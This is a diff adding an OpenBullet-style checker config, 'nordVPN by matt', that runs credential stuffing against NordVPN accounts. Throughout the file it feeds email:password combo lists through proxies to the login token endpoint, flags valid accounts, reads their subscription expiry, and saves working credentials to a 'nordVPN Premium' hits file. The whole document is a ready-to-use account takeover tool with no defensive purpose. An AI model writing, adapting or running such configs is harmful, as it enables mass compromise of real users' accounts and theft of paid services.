@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "nordVPN by matt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-05T17:13:51.0925627+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Destination to folder where you want to save your hits",
+      "VariableName": "Path",
+      "Id": 192490473
+    }
+  ],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY ",\"message\":\"Unauthorized\"" 
+    KEY "Unauthorized" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+  KEYCHAIN Success OR 
+    KEY "user_id" 
+
+#Token PARSE "<SOURCE>" LR ",\"token\":\"" "\",\"" -> VAR "Token" 
+
+#Encrypt FUNCTION Base64Encode "token:<Token>" -> VAR "ENToken" 
+
+#Capture REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <ENToken>" 
+
+#Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "Invalid authorization header" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+  KEYCHAIN Success OR 
+    KEY "created_at\":\"" 
+
+#Expiration PARSE "<SOURCE>" LR "\",\"expires_at\":\"" "\",\"" -> CAP "Expiration" 
+
+#Time_fix FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<Expiration>" -> VAR "Time" 
+
+#Current_time FUNCTION CurrentUnixTime -> VAR "Current Time" 
+
+#Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Time>" LessThan "<Current Time>" 
+    KEY "<Current Time>" EqualTo "<Time>" 
+    KEY "<Current Time>" GreaterThan "<Time>" 
+
+#Fingerprint PARSE "<SOURCE>" LR "\",\"expires_at\":\"" "\"" -> CAP "Expiration" "" " | made by matt" 
+
+#GetTime REQUEST GET "https://time.is/en/PT" 
+  CONTENT "https://time.is/en/PT" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Date PARSE "<SOURCE>" LR "title=\"Click for calendar\">" ", week" -> VAR "Date" 
+
+#Save UTILITY File "<Path>\\nordVPN Premium <Date>.txt" AppendLines "<USER>:<PASS> | Expiration = <Expiration>" -> VAR "Save" 
+
